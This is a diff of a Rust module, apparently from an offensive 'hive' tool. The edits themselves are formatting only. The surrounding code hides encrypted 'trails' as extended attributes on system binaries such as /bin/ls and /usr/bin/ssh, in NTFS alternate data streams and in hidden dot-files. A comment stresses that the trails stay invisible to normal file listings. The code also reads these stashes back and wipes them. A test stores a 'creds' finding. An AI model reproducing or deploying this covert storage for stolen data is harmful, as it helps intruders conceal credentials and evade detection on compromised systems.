@@ -10,7 +10,7 @@
 //
 // All trail data is ChaCha20 encrypted with a colony-derived key.
 
-use crate::crypto::{encrypt_chacha20, decrypt_chacha20, derive_key};
+use crate::crypto::{decrypt_chacha20, derive_key, encrypt_chacha20};
 use tracing::info;
 
 const XATTR_NAME: &str = "user.hive_trail";
@@ -22,7 +22,13 @@ const TRAIL_SEED: &[u8] = b"STIGMERGY_COLONY_KEY_V2_X9kM3pQ";
 /// Leave an encrypted trail as an extended attribute on a legitimate system binary.
 /// xattr is invisible to `ls -la`, not shown in normal file listings.
 pub fn leave_trail_xattr(key: &str, value: &[u8]) -> bool {
-    let targets = ["/bin/ls", "/bin/ps", "/usr/bin/ssh", "/bin/bash", "/usr/bin/python3"];
+    let targets = [
+        "/bin/ls",
+        "/bin/ps",
+        "/usr/bin/ssh",
+        "/bin/bash",
+        "/usr/bin/python3",
+    ];
     let encrypted = encrypt_trail(value);
 
     #[cfg(target_os = "linux")]
@@ -40,7 +46,11 @@ pub fn leave_trail_xattr(key: &str, value: &[u8]) -> bool {
                 0, // XATTR_CREATE = 1, but 0 (replace) is safer for re-writes
             );
             if ret == 0 {
-                info!("STIGMERGY: xattr trail on {} ({} bytes)", target, c_val.len());
+                info!(
+                    "STIGMERGY: xattr trail on {} ({} bytes)",
+                    target,
+                    c_val.len()
+                );
                 return true;
             }
         }
@@ -56,31 +66,37 @@ pub fn read_trails_xattr() -> Vec<(String, Vec<u8>)> {
 
     #[cfg(target_os = "linux")]
     {
-    let targets = ["/bin/ls", "/bin/ps", "/usr/bin/ssh", "/bin/bash"];
-    let mut trails = Vec::new();
+        let targets = ["/bin/ls", "/bin/ps", "/usr/bin/ssh", "/bin/bash"];
+        let mut trails = Vec::new();
 
-    for target in &targets {
-        let c_key = std::ffi::CString::new(XATTR_NAME).expect("XATTR_NAME without null");
-        let c_path = std::ffi::CString::new(*target).expect("target path without null");
+        for target in &targets {
+            let c_key = std::ffi::CString::new(XATTR_NAME).expect("XATTR_NAME without null");
+            let c_path = std::ffi::CString::new(*target).expect("target path without null");
 
-        // Get attribute size first
-        let size = unsafe {
-            libc::getxattr(c_path.as_ptr(), c_key.as_ptr(), std::ptr::null_mut(), 0)
-        };
-        if size <= 0 { continue; }
+            // Get attribute size first
+            let size =
+                unsafe { libc::getxattr(c_path.as_ptr(), c_key.as_ptr(), std::ptr::null_mut(), 0) };
+            if size <= 0 {
+                continue;
+            }
 
-        let mut buf = vec![0u8; size as usize];
-        let read = unsafe {
-            libc::getxattr(c_path.as_ptr(), c_key.as_ptr(), buf.as_mut_ptr() as *mut libc::c_void, buf.len())
-        };
-        if read > 0 {
-            buf.truncate(read as usize);
-            if let Some(decrypted) = decrypt_trail(&buf) {
-                trails.push((target.to_string(), decrypted));
+            let mut buf = vec![0u8; size as usize];
+            let read = unsafe {
+                libc::getxattr(
+                    c_path.as_ptr(),
+                    c_key.as_ptr(),
+                    buf.as_mut_ptr() as *mut libc::c_void,
+                    buf.len(),
+                )
+            };
+            if read > 0 {
+                buf.truncate(read as usize);
+                if let Some(decrypted) = decrypt_trail(&buf) {
+                    trails.push((target.to_string(), decrypted));
+                }
             }
         }
-    }
-    trails
+        trails
     }
 }
 
@@ -101,11 +117,18 @@ pub fn leave_trail_ads(_key: &str, value: &[u8]) -> bool {
     for target in &targets {
         let ads_path = format!("{}:{}", target, ADS_STREAM);
         if let Ok(mut f) = std::fs::OpenOptions::new()
-            .create(true).write(true).truncate(true).open(&ads_path)
+            .create(true)
+            .write(true)
+            .truncate(true)
+            .open(&ads_path)
         {
             use std::io::Write;
             if f.write_all(&encrypted).is_ok() {
-                info!("STIGMERGY: ADS trail on {} ({} bytes)", ads_path, encrypted.len());
+                info!(
+                    "STIGMERGY: ADS trail on {} ({} bytes)",
+                    ads_path,
+                    encrypted.len()
+                );
                 return true;
             }
         }
@@ -144,7 +167,10 @@ pub fn leave_trail_file(key: &str, encrypted_data: &[u8]) -> bool {
     ];
     for path in &paths {
         if let Ok(mut f) = std::fs::OpenOptions::new()
-            .create(true).write(true).truncate(true).open(path)
+            .create(true)
+            .write(true)
+            .truncate(true)
+            .open(path)
         {
             use std::io::Write;
             let _ = f.write_all(encrypted_data);
@@ -163,7 +189,10 @@ pub fn read_trails_file() -> Vec<(String, Vec<u8>)> {
         if let Ok(entries) = std::fs::read_dir(dir) {
             for entry in entries.flatten() {
                 let name = entry.file_name().to_string_lossy().to_string();
-                if name.starts_with(".hive_") || name.starts_with(".hx_") || name.starts_with(".hs_") {
+                if name.starts_with(".hive_")
+                    || name.starts_with(".hx_")
+                    || name.starts_with(".hs_")
+                {
                     if let Ok(data) = std::fs::read(entry.path()) {
                         if data.len() < 10000 {
                             if let Some(decrypted) = decrypt_trail(&data) {
@@ -204,7 +233,9 @@ pub fn clean_trails() {
         let c_key = std::ffi::CString::new(XATTR_NAME).expect("XATTR_NAME without null");
         for target in &targets {
             let c_path = std::ffi::CString::new(*target).expect("target path without null");
-            unsafe { libc::removexattr(c_path.as_ptr(), c_key.as_ptr()); }
+            unsafe {
+                libc::removexattr(c_path.as_ptr(), c_key.as_ptr());
+            }
         }
     }
     // Clean file trails
@@ -212,7 +243,10 @@ pub fn clean_trails() {
         if let Ok(entries) = std::fs::read_dir(dir) {
             for entry in entries.flatten() {
                 let name = entry.file_name().to_string_lossy().to_string();
-                if name.starts_with(".hive_") || name.starts_with(".hx_") || name.starts_with(".hs_") {
+                if name.starts_with(".hive_")
+                    || name.starts_with(".hx_")
+                    || name.starts_with(".hs_")
+                {
                     let _ = std::fs::remove_file(entry.path());
                 }
             }
@@ -288,7 +322,9 @@ mod tests {
         let encrypted = encrypt_trail(data);
         // Tamper with ciphertext
         let mut tampered = encrypted.clone();
-        if !tampered.is_empty() { tampered[0] ^= 0xFF; }
+        if !tampered.is_empty() {
+            tampered[0] ^= 0xFF;
+        }
         let result = decrypt_trail(&tampered);
         assert!(result.is_none() || result != Some(data.to_vec()));
     }
@@ -308,8 +344,10 @@ mod tests {
     fn test_persist_and_recover() {
         use std::sync::OnceLock;
         static LOCK: OnceLock<std::sync::Mutex<()>> = OnceLock::new();
-        let _guard = LOCK.get_or_init(|| std::sync::Mutex::new(()))
-            .lock().unwrap_or_else(|e| e.into_inner());
+        let _guard = LOCK
+            .get_or_init(|| std::sync::Mutex::new(()))
+            .lock()
+            .unwrap_or_else(|e| e.into_inner());
         persist_finding("creds", "root:hunter2");
         let knowledge = recover_knowledge();
         assert!(!knowledge.is_empty(), "Should recover persisted knowledge");
